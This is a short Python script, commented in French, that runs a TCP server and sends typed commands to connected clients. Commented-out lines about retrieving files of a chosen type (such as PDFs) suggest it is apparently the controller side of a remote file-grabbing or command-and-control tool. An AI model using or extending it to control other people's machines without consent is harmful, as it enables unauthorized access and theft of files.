#Admin_Server_Script.py

import socket 

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # AF.Inet pour les IPs , SOCK_TREAM pour une conn TCP 

local_pc = ""
port = 12345

s.bind((local_pc, port)) #associer la socket à une adresse et/ou un numéro de port (locaux)
s.listen()

while True:
    print("Server listening ...")
    conn, addr = s.accept()
    print("Connection OK :", addr)
    
    try:
        
        while True:
           # type_fichier = input("Spécifiez le type de fichier à récupérer (par exemple, .pdf) : ")
            #commande = f"recupere {type_fichier}"
            command = input("Command: ")
            conn.sendall(command.encode())
            
    except:
         print("Disconned from: ", addr)
       
